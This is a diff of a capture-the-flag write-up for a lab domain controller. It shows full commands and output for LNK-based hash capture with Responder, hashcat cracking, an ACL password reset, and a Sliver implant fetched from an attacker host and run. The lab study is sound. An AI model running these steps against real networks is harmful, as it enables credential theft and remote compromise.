@@ -14,32 +14,67 @@ ShareThePain lives up to its name — the whole box pivots on a **writable SMB s
 ## Recon
 
 ```bash
-rustscan -a 10.1.185.142 -- -A
+┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
+└─$ rustscan -a 10.1.185.142 -- -A
+Open 10.1.185.142:53
+Open 10.1.185.142:88
+Open 10.1.185.142:135
+Open 10.1.185.142:139
+Open 10.1.185.142:389
+Open 10.1.185.142:445
+Open 10.1.185.142:464
+Open 10.1.185.142:593
+Open 10.1.185.142:636
+Open 10.1.185.142:3268
+Open 10.1.185.142:3269
+Open 10.1.185.142:3389
+Open 10.1.185.142:5985
+Open 10.1.185.142:9389
 ```
 
-A textbook domain-controller footprint — DNS, Kerberos, LDAP, SMB, WinRM, ADWS — with **SMB signing enabled** but **null authentication allowed**. The certs named the domain **hack.smarter** and host **DC01**. Into `/etc/hosts`.
+A textbook domain-controller footprint — DNS, Kerberos, LDAP, SMB, WinRM, ADWS. The certs named the domain **hack.smarter** and host **DC01**. Into `/etc/hosts`.
 
 ## SMB Enumeration — the writable share
 
 A null session was permitted, so I listed shares straight away:
 
 ```bash
-nxc smb 10.1.185.142 -u '' -p '' --shares
+┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
+└─$ nxc smb 10.1.185.142 -u '' -p '' --shares
+SMB   10.1.185.142  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB   10.1.185.142  445  DC01  [+] hack.smarter\:
+SMB   10.1.185.142  445  DC01  Share       Permissions   Remark
+SMB   10.1.185.142  445  DC01  -----       -----------   ------
+SMB   10.1.185.142  445  DC01  ADMIN$                    Remote Admin
+SMB   10.1.185.142  445  DC01  C$                        Default share
+SMB   10.1.185.142  445  DC01  IPC$                      Remote IPC
+SMB   10.1.185.142  445  DC01  NETLOGON                  Logon server share
+SMB   10.1.185.142  445  DC01  Share       READ,WRITE
+SMB   10.1.185.142  445  DC01  SYSVOL                    Logon server share
 ```
 
-Among the defaults sat a custom share simply called **`Share`** — with **READ,WRITE** for everyone. On a box named ShareThePain, that's not subtle.
+Among the defaults sat a custom share simply called **`Share`** — with **READ,WRITE** for everyone. On a box named ShareThePain, that's not subtle. Note **SMB signing is enabled** (`signing:True`), so relaying is off the table — but capturing and cracking is not.
 
 ## Forced Authentication — LNK poisoning
 
-A writable share that privileged users (or the DC) browse is a classic **forced-authentication** setup. I planted a malicious shortcut on it with netexec's `slinky` module and stood up Responder to catch the callback:
+A writable share that privileged users (or the DC) browse is a classic **forced-authentication** setup. I planted a malicious shortcut on it with netexec's `slinky` module:
 
 ```bash
-nxc smb 10.1.185.142 -u 'guest' -p '' -M slinky -o SERVER=<attacker-ip> SHARES=Share NAME=systemd
-# [+] Created LNK file on the Share share
+┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
+└─$ nxc smb 10.1.185.142 -u 'guest' -p '' -M slinky -o SERVER=10.200.64.188 SHARES=Share NAME=systemd
+SLINKY  10.1.185.142  445  DC01  [+] Found writable share: Share
+SLINKY  10.1.185.142  445  DC01  [+] Created LNK file on the Share share
 ```
 
+Then stood up Responder to catch the callback:
+
 ```bash
-sudo responder -I tun0 -v
+┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
+└─$ sudo responder -I tun0 -v
+[+] Listening for events...
+[SMB] NTLMv2-SSP Client   : 10.1.185.142
+[SMB] NTLMv2-SSP Username : HACK\bob.ross
+[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:e8c2599969a1cb3d:F9BBDB3A7D25A2228A5BBBC53D3AF2E8:0101000000000000...
 ```
 
 Almost immediately, Responder logged repeated **NTLMv2** authentications from **HACK\bob.ross** — the share was being auto-rendered, and the shortcut's icon path forced the DC to authenticate to me.
@@ -49,18 +84,26 @@ Almost immediately, Responder logged repeated **NTLMv2** authentications from **
 I saved the captured NetNTLMv2 hash and cracked it with hashcat mode 5600:
 
 ```bash
-hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
-# BOB.ROSS : 137Password123!@#
+┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
+└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+BOB.ROSS::HACK:e8c2599969a1cb3d:f9bbdb3a7d25a2228a5bbbc53d3af2e8:0101...:137Password123!@#
+Hash.Mode........: 5600 (NetNTLMv2)
 ```
+
+Creds: **BOB.ROSS : 137Password123!@#**.
 
 ## Foothold & Enumeration
 
-The creds validated over SMB. I looted SYSVOL (GPO policies) and ran a full BloodHound collection to find a path forward:
+The creds validated over SMB, and I ran a full BloodHound collection to find a path forward:
 
 ```bash
-nxc smb 10.1.185.142 -u 'BOB.ROSS' -p '137Password123!@#' --shares
-smbclient //hack.smarter/SYSVOL -U "BOB.ROSS"
-nxc ldap 10.1.185.142 -u 'BOB.ROSS' -p '137Password123!@#' --bloodhound --collection All --dns-server 10.1.185.142
+┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
+└─$ nxc smb 10.1.185.142 -u 'BOB.ROSS' -p '137Password123!@#'
+SMB   10.1.185.142  445  DC01  [+] hack.smarter\BOB.ROSS:137Password123!@#
+
+┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
+└─$ nxc ldap 10.1.185.142 -u 'BOB.ROSS' -p '137Password123!@#' --bloodhound --collection All --dns-server 10.1.185.142
+LDAP  10.1.185.142  389  DC01  [+] hack.smarter\BOB.ROSS:137Password123!@#
 ```
 
 ## ACL Abuse → alice.wonderland
@@ -68,8 +111,12 @@ nxc ldap 10.1.185.142 -u 'BOB.ROSS' -p '137Password123!@#' --bloodhound --collec
 BloodHound revealed that **BOB.ROSS** could reset the password of **ALICE.WONDERLAND**. One `net rpc` command later, that account was mine:
 
 ```bash
-net rpc password "ALICE.WONDERLAND" "cyber@123" -U "HACK.SMARTER"/"BOB.ROSS"%'137Password123!@#' -S 10.1.185.142
-nxc smb 10.1.185.142 -u 'ALICE.WONDERLAND' -p 'cyber@123'   # [+] valid
+┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
+└─$ net rpc password "ALICE.WONDERLAND" "cyber@123" -U "HACK.SMARTER"/"BOB.ROSS"%'137Password123!@#' -S 10.1.185.142
+
+┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
+└─$ nxc smb 10.1.185.142 -u 'ALICE.WONDERLAND' -p 'cyber@123'
+SMB   10.1.185.142  445  DC01  [+] hack.smarter\ALICE.WONDERLAND:cyber@123
 ```
 
 ## User Flag
@@ -77,9 +124,13 @@ nxc smb 10.1.185.142 -u 'ALICE.WONDERLAND' -p 'cyber@123'   # [+] valid
 alice.wonderland had WinRM access:
 
 ```bash
-evil-winrm -i HACK.SMARTER -u 'ALICE.WONDERLAND' -p 'cyber@123'
+┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
+└─$ evil-winrm -i HACK.SMARTER -u 'ALICE.WONDERLAND' -p 'cyber@123'
+*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> dir
+    Directory: C:\Users\alice.wonderland\Desktop
+-a----          9/3/2025   2:07 PM             54 user.txt
 *Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> type user.txt
-# bWFkZV9pdF90aGlzX2Zhcgo=   ->  base64 -d  ->  made_it_this_far
+bWFkZV9pdF90aGlzX2Zhcgo=      # base64 -d -> made_it_this_far
 ```
 
 ## Lateral Movement — toward the internal SQL service
@@ -87,19 +138,26 @@ evil-winrm -i HACK.SMARTER -u 'ALICE.WONDERLAND' -p 'cyber@123'
 Enumerating listeners from the alice.wonderland shell turned up something not exposed externally — **MSSQL bound to localhost**:
 
 ```powershell
-netstat -ano | findstr LISTENING
-# TCP  127.0.0.1:1433  ...  4260
-Get-Process -Id 4260   # sqlservr
+*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> netstat -ano | findstr LISTENING
+  TCP    127.0.0.1:1433         0.0.0.0:0              LISTENING       4260
+
+*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> Get-Process -Id 4260
+    829      57   367884     246416    4260   0 sqlservr
 ```
 
-A local-only service means the next move is to **pivot** through this host to reach it. I set up a Sliver C2 implant for the tunnel and staged it over a quick HTTP server:
+A local-only service means the next move is to **pivot** through this host to reach it. I generated a Sliver mTLS implant for the tunnel and staged it over a quick HTTP server:
 
 ```bash
-sliver > generate --mtls <attacker-ip>:443 --os windows --format exe pivot.exe
+[127.0.0.1] sliver > generate --mtls 10.200.64.188:443 --os windows --format exe pivot.exe
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 1m36s
+[*] Implant saved to .../ADVISORY_GRATITUDE.exe
 ```
 
 ```powershell
-wget http://<attacker-ip>:8000/pivot.exe -O pivot.exe ; ./pivot.exe
+*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> wget http://10.200.64.188:8000/ADVISORY_GRATITUDE.exe -O ADVISORY_GRATITUDE.exe
+*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> ./ADVISORY_GRATITUDE.exe
 ```
 
 ## Privilege Escalation — root
